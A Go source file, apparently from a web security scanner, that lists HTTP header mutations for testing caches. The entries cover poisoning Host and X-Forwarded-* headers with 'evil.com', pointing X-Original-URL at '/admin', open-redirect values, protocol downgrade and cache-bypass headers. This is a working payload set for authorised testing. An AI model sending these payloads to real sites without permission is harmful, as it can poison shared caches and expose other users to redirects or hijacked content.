package headers

import "github.com/cc1a2b/jshunter/engine"

func GetCacheMutations() []engine.Mutation {
	return []engine.Mutation{
		{Header: "X-Forwarded-Host", Value: "evil.com", Category: "Cache", Impact: "Cache Poisoning"},
		{Header: "X-Host", Value: "evil.com", Category: "Cache", Impact: "Cache Poisoning"},
		{Header: "X-Original-URL", Value: "/admin", Category: "Cache", Impact: "Cache Deception"},
		{Header: "X-Rewrite-URL", Value: "/admin", Category: "Cache", Impact: "Cache Deception"},
		{Header: "X-Original-URL", Value: "//evil.com", Category: "Cache", Impact: "Open Redirect via Cache"},
		{Header: "X-Forwarded-Scheme", Value: "http", Category: "Cache", Impact: "Protocol Downgrade"},
		{Header: "X-Forwarded-Scheme", Value: "nothttps", Category: "Cache", Impact: "Protocol Confusion"},
		{Header: "Host", Value: "evil.com", Category: "Cache", Impact: "Host Header Poisoning"},
		{Header: "X-Forwarded-Server", Value: "evil.com", Category: "Cache", Impact: "Cache Poisoning"},
		{Header: "X-HTTP-Host-Override", Value: "evil.com", Category: "Cache", Impact: "Cache Poisoning"},
		{Header: "Pragma", Value: "no-cache", Category: "Cache", Impact: "Cache Bypass"},
		{Header: "Cache-Control", Value: "no-cache, no-store, must-revalidate", Category: "Cache", Impact: "Cache Bypass"},
		{Header: "Cache-Control", Value: "max-age=0", Category: "Cache", Impact: "Cache Bypass"},
		{Header: "If-None-Match", Value: "invalid-etag", Category: "Cache", Impact: "Cache Validation Bypass"},
		{Header: "If-Modified-Since", Value: "Mon, 01 Jan 1970 00:00:00 GMT", Category: "Cache", Impact: "Cache Validation Bypass"},
		{Header: "X-Cache", Value: "hit", Category: "Cache", Impact: "Cache Status Manipulation"},
	}
}
